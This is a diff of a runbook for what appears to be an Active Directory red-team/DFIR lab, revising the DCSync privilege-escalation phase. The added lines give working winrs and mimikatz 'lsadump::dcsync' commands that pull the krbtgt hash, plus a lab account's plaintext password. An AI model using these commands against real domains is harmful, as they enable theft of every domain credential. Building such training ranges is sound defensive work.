@@ -1,10 +1,10 @@
-# CAMPAIGNS v2 — Phase 6 — Privilege Escalation (DCSync)
+# CAMPAIGNS v3 — Phase 6 — Privilege Escalation (DCSync)
 
-> **Campaign v2** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
-> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
+> **Campaign v3** — read the theory here, run each command block live, then update [`CAMPAIGNS-METADATA.md`](../CAMPAIGNS-METADATA.md).
+> **Index:** [`CAMPAIGNS-RUNBOOK-README.md`](CAMPAIGNS-RUNBOOK-README.md) · **Full reference:** [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) · **Topology:** [`CAMPAIGNS.md`](../CAMPAIGNS.md)
 > **DFIR track:** [`DFIR-Nexus-Pioneer-workflow.md`](../DFIR-Nexus-Pioneer-workflow.md)
 >
-> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v2.md`](../CAMPAIGNS_v2.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
+> **Sync rule:** When you change this runbook during lab work, apply the same edit to [`CAMPAIGNS_v3.md`](../CAMPAIGNS_v3.md) (matching section). Re-run `python tools/split-campaign-runbooks.py --check` to verify coverage.
 
 **Default host:** Kali / provisioning (`192.168.77.60`) unless a step says otherwise.
 
@@ -16,10 +16,27 @@
 |                   |                                                                                      |
 | ----------------- | ------------------------------------------------------------------------------------ |
 | **Target**        | dc02 (.11) — DRSUAPI replication                                                     |
-| **From**          | Kali                                                                                 |
+| **From**          | **mbr01** (after T102 coercion captured dc02$ TGT)                                 |
 | **Starting cred** | `dc02$` TGT (from Phase 5) or child DA                                               |
 | **What you earn** | Child krbtgt hash + all user/computer hashes → **Domain Admin** in child.cadre.local |
+| **MITRE**         | T1003.006 (DCSync)                                                                   |
 
+
+In the realistic multi-hop chain, DCSync is executed **from mbr01** using the captured dc02$ machine account credentials, or from ws01 after bringing the captured material back. This mirrors real operations where the attacker uses a member server with existing domain trust rather than running everything from their C2.
+
+**Step 1 — Transfer captured dc02$ TGT from mbr01 to ws01 (or use directly on mbr01):**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! powershell -Command "Get-Content C:\Tools\cadre-attack\dc02_tgs.txt"
+```
+
+**Step 2 — Run DCSync from mbr01 using Rubeus + mimikatz:**
+
+```powershell
+winrs -r:mbr01.child.cadre.local -u:child\analyst_t1 -p:T13r_An@lyst! "C:\Tools\ADTools\mimikatz.exe \"privilege::debug\" \"lsadump::dcsync /domain:child.cadre.local /user:krbtgt\" \"exit\""
+```
+
+**Fallback from Kali:**
 
 ```bash
 export KRB5CCNAME=/tmp/dc02.ccache
